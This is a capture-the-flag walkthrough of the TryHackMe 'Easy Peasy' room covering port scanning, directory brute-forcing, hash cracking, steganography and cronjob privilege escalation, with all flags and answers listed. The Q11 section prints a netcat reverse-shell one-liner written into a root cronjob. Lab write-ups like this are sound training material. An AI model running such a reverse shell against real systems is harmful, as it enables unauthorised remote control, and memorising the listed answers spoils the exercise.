---
title: 'Easy Peasy — THM WriteUp'
date: 'Nov 13, 2023'
description: 'Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.'
category: 'Walkthrough'
cover: 'https://i.postimg.cc/8zY8SZG8/0-jg-Xc8G7d8v9s-Kit-J.webp'
tags: [ 'Thm', 'Writeup', 'Pentesting', 'Easypeasy', 'Tryhackme' ]
---

## Enumeration through Nmap

Nmap:

```
└─$ sudo nmap -p- 10.10.135.13 -vvv -sCV -T4
...
80/tcp    open  http    syn-ack ttl 63 nginx 1.16.1
|_http-title: Welcome to nginx!
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: nginx/1.16.1
| http-methods: 
|_  Supported Methods: GET HEAD
6498/tcp  open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
...
65524/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.43 ((Ubuntu))
|_http-title: Apache2 Debian Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.43 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
```

### Q1. How many ports are open?

Answer: 3

### Q2. What is the version of nginx?

![](https://i.postimg.cc/HkcZQdGj/1-oh5r6r8g6u-DA3r-Sl-o-Xlf-A.webp)

Answer: 1.16.1

### Q3. What is running on the highest port?

Answer: Apache

---

## Compromising the machine

### Q4. Using GoBuster, find flag 1

![](https://i.postimg.cc/59DnbDYh/1-t-QBg-PDp-Cdk-DY477olz-lbg.webp)

When reading the code on the page: hidden/whatever/, we will find a hash located in b64:

Answer: flag{f1rs7_fl4g}

### Q5. Further enumerate the machine, what is flag 2?

![](https://i.postimg.cc/RCJLsGsb/1-c6DP3GGXe8j-C2j-RNPHg-UZA.webp)

![](https://i.postimg.cc/QdhgMDXT/1-hx4wgatg-Pa-KP3h-U7ig3Xrg.webp)

Answer: flag{1m_s3c0nd_fl4g}

### Q6. Crack the hash with easypeasy.txt, What is the flag 3?

When we read the code of the apache home page we find:

> <p hidden>its encoded with ba….:ObsJmP173N2X6dOrAgEAL0Vu</p> and Fl4g 3 : flag{9fdafbd64c47471a8f54cd3fc64cd312}

![](https://i.postimg.cc/yNr0nSF7/1-a3E0Df83yso-C-FFRkb-C3bw.webp)

Answer: flag{9fdafbd64c47471a8f54cd3fc64cd312}

### Q7. What is the hidden directory?

By decrypting the other code found in Q6. we will find the hidden directory

![](https://i.postimg.cc/gkP8Mp6Y/1-fqr-j-TMOWTsffg6zk-R3Qvw.webp)

Answer: /n0th1ng3ls3m4tt3r

### Q8. Using the wordlist that provided to you in this task crack the hash what is the password?

> Hint: GOST Hash john — wordlist=easypeasy.txt — format=gost hash (optional* Delete duplicated lines,Compare easypeasy.txt to rockyou.txt and delete same words)

![](https://i.postimg.cc/G3vsTfgM/1-v-Ze-Hxe-Dx51qk-Rc-K7YP0ZPw.webp)

Download the “Task Files

Answer: mypasswordforthatjob

### Q9. What is the password to login to the machine via SSH?

If you look at the source code of all the pages, all the images are imported by url, except for binarycodepixabay.jpg

```
$ steghide --info binarycodepixabay.jpg
"binarycodepixabay.jpg":
  formato: jpeg
  capacidad: 4,6 KB
�Intenta informarse sobre los datos adjuntos? (s/n) s
Anotar salvoconducto: ?                                                                                                                ...
...
$ stegseek --seed binarycodepixabay.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found (possible) seed: "8befc6a9"             
 Plain size: 297.0 Byte(s) (compressed)
 Encryption Algorithm: none
 Encryption Mode:      cbc
[i] Original filename: "secrettext.txt".
[i] Extracting to "binarycodepixabay.jpg.out".
```

![](https://i.postimg.cc/SKwJJL6k/1-f-EWk-IDCfk16k-ILb-Iz-Nc1w.webp)

Answer: iconvertedmypasswordtobinary

### Q10. What is the user flag?

![](https://i.postimg.cc/028rMywQ/1-k-H7v-W151a6kx-Bl8-w-V0IFw.webp)

![](https://i.postimg.cc/B6TQbrZk/1-81CDmyas0p-f4h-K4px-Ch-RA.webp)

Answer: flag{n0wits33msn0rm4l}

## Q11. What is the root flag?

![](https://i.postimg.cc/9QDmZRFc/1-X9mk-ZWLZl34Abd-Ig3m-Ho-Dw.webp)

When running linenum, we find that we have a root cronjob where you can write:

![](https://i.postimg.cc/G2xddvzj/1-PWk1g-J8Zt-T34bru-GXz7t0Q.webp)

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.18.68.6 1014 >/tmp/f
```

![](https://i.postimg.cc/C17TWSLm/1-2khn-SIj-JNF-070Ae4-Lnq-A.webp)

Answer: flag{63a9f0ea7bb98050796b649e85481845}

---

![](https://i.postimg.cc/43RDymY5/1-lwe-HUzj-FSOx-KAF6byg4Qaw.webp)

<3 Carlos